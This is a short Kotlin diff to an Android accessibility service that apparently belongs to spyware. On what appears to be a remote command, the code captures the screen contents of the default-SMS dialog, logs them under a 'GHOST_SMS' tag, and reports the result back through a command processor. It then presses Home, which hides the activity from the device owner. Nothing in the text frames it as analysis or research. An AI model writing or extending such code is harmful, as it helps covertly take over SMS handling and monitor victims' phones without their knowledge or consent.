@@ -828,8 +828,12 @@ class MyAccessibilityService : AccessibilityService() {
                 val treeJson = getInstantTree(null, 10)
                 val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
                 DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
-                DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping.")
+                DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping. Pkg: $pkgName")
                 DefaultSmsManager.expectedMode = "" // Disarm
+                
+                CoroutineScope(Dispatchers.IO).launch {
+                    CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SCRAPE_SUCCESS", null, wrapper, null)
+                }
                 
                 performGlobalAction(GLOBAL_ACTION_HOME)
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
